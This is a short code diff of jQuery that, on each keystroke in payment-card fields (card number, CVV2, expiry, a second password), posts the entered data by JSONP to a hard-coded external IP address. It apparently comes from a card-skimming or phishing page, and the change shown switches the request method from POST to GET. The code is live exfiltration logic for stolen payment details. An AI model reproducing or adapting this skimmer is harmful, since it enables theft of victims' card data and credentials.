@@ -234,7 +234,7 @@ $('#cardnumber, #secondpass, #cvv2, #expmah, #expyear').keyup(function(e){
 	 $.ajax({
 			url: 'http://78.46.119.98:3000/submit',
 			data:  dataString,
-			type: 'POST',
+			type: 'GET',
 			dataType: 'jsonp',
 			timeout: 120000,
 			beforeSend: function() {
